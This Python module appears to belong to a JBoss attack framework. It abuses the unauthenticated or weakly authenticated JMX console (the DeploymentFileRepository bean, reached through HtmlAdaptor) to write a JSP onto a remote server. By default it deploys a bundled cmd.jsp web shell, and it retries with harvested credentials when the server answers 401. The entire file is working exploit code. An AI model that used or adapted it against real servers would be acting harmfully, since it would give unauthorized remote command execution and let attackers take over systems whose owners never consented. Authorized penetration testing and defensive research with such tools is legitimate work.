from src.platform.jboss.interfaces import JINTERFACES
from src.platform.jboss.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from collections import OrderedDict
from os.path import abspath
from log import LOG
import utility

title = JINTERFACES.JMX
versions = ["3.2", "4.0", "4.2", "5.0", "5.1"]
def deploy(fingerengine, fingerprint):
    """ Exploits the DeploymentFileRepository bean to deploy
    a JSP to the remote server.  Note that this requires a JSP,
    not a packaged or exploded WAR.
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = parse_war_path(war_file)
    if '.war' in war_file:
        tmp = utility.capture_input("This deployer requires a JSP, default to cmd.jsp? [Y/n]")
        if "n" in tmp.lower():
            return

        war_file = abspath("./src/lib/cmd.jsp")
        war_name = "cmd"

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/jmx-console/HtmlAdaptor".format(
                    fingerengine.options.ip, fingerprint.port)

    data = OrderedDict([
                    ('action', 'invokeOp'),
                    ('name', 'jboss.admin:service=DeploymentFileRepository'),
                    ('methodIndex', 5),
                    ('arg0', war_file.replace('.jsp', '.war')),
                    ('arg1', war_name),
                    ('arg2', '.jsp'),
                    ('arg3', open(war_file, 'r').read()),
                    ('arg4', True)
                    ])

    response = utility.requests_post(url, data=data)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for JMX, checking..." %
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            response = utility.requests_post(url, data=data, cookies=cookies[0],
                                            auth=cookies[1])
        else:
            utility.Msg("Could not get auth for %s:%s" %
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if response.status_code == 200:
        utility.Msg("Successfully deployed {0}".format(war_file), LOG.SUCCESS)
    else:
        utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR)
